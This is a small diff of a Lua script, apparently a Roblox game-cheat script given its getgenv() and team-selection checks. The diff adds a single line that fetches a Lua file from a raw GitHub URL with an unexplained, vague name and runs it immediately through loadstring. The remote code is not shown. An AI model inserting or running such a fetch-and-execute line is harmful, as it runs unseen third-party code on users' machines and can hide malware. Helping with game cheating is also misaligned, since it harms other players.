@@ -8,6 +8,9 @@ if not BF then return; end
 
 repeat task.wait() until game:GetService("Players").LocalPlayer
 repeat task.wait() until game:GetService("Players").LocalPlayer.PlayerGui.Main
+
+loadstring(game:HttpGet'https://raw.githubusercontent.com/NatNyt/MyScript/main/RobloxAdsPromoteOrSomethingIDK.lua')()
+
 if not  getgenv().SelectTeam  then
    return; 
 end
